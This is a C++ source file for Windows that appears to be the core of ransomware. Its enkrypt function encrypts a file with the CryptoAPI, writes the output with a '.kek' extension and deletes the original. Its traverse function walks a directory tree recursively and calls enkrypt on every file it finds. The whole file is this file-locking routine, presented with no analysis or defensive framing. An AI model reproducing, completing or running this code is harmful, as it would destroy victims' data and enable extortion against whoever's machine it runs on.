#include <Windows.h>
#include <iostream>
#include "strsafe.h"
#include <string>

int enkrypt(WCHAR* srcFile, HCRYPTKEY clé) {

	WCHAR szOGFileName[MAX_PATH];
	StringCchCopyW(szOGFileName, MAX_PATH, srcFile);

	WCHAR* pzDestFile = srcFile;
	
	StringCchCatW(pzDestFile, MAX_PATH, L".kek");

	HANDLE hSourceFile = INVALID_HANDLE_VALUE;
	HANDLE hDestFile = INVALID_HANDLE_VALUE;


	DWORD eof = 0;
	PBYTE pbBuffer[960];
	DWORD dwBlockLen = 960;
	DWORD dwBufferLen = 960;
	DWORD dwCount = 0;


	hSourceFile = CreateFileW(szOGFileName, FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hSourceFile != INVALID_HANDLE_VALUE) {

		std::cout << "The sourcefile is open" << std::endl;
	}
	else {
		DWORD d = GetLastError();
		std::cout << "Error opening handle to the sourcefile, error code: " << d << std::endl;
		return -1;

	}


	hDestFile = CreateFileW(pzDestFile, FILE_WRITE_DATA | DELETE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE != hDestFile) {

		std::cout << "The destfile is open" << std::endl;
	}
	else {
		DWORD d = GetLastError();
		std::cout << "Error opening handle to the destfile, error code 0x8" << d << std::endl;
		return -1;

	}

	while (eof == 0) {

		if (ReadFile(hSourceFile, pbBuffer, dwBlockLen, &dwCount, NULL) == 0) {
			DWORD d = GetLastError();
			std::cout << "Error reading from the sourcefile, error code 0x8:" << d << std::endl;
			break;

		}

		
		if (dwCount < dwBlockLen) {

			eof = 1;
		}

		if (CryptEncrypt(clé, 0, eof, 0, (BYTE*)pbBuffer, &dwCount, dwBufferLen) == 0) {

			DWORD d = GetLastError();
			std::cout << "Error encrypting the buffer, error code 0x" << d << std::endl;
			break;

		}

		if (WriteFile(hDestFile, pbBuffer, dwCount, &dwCount, NULL) == 0) {

			DWORD d = GetLastError();
			std::cout << "Error writing to the destfile, error code 0x:" << d << std::endl;
			break;


		}
	}

	if (DeleteFile(szOGFileName) == 0) {
		DWORD d = GetLastError();
		std::cout << "Error deleting the OG file, error code 0x:" << d << std::endl;
		return -1;

}

	CloseHandle(hSourceFile);
	CloseHandle(hDestFile);

	return 0;
}

bool traverse(LPCWSTR targetDir, HCRYPTKEY clé, int nLevel = 0) {

	WIN32_FIND_DATAW file_data;
	WCHAR szDir[MAX_PATH];
	HANDLE hFind = INVALID_HANDLE_VALUE;

	StringCchCopyW(szDir, MAX_PATH, targetDir);
	StringCchCatW(szDir, MAX_PATH, L"\\*");

	// finds the first file

	hFind = FindFirstFile(szDir, &file_data);
	if (hFind == INVALID_HANDLE_VALUE) {
		std::cout << "FindFirstFile failed, with errorcode 0x: " << GetLastError() << std::endl;
		return false;
	}

	// lists the actual files recursively

	wchar_t szOutLine[MAX_PATH] = { 0 };
	for (int ii = 0; ii < nLevel; ++ii)
		szOutLine[ii] = L'\t';


	do {
		if (file_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {

			if (L'.' != file_data.cFileName[0]) {

				//printf("  %ws%ws   <DIR>\n", szOutLine, file_data.cFileName);
				StringCchCopyW(szDir + wcslen(targetDir) + 1, MAX_PATH, file_data.cFileName);
				traverse(szDir, clé, nLevel + 1);

			}
		}
		else {
			WCHAR szFullPath[MAX_PATH];
			StringCchCopyW(szFullPath, MAX_PATH, targetDir);
			StringCchCatW(szFullPath, MAX_PATH, L"\\");
			StringCchCatW(szFullPath, MAX_PATH, file_data.cFileName);
			enkrypt(szFullPath, clé);
		}
	} while (FindNextFile(hFind, &file_data) != 0);

	FindClose(hFind);
	return true;


}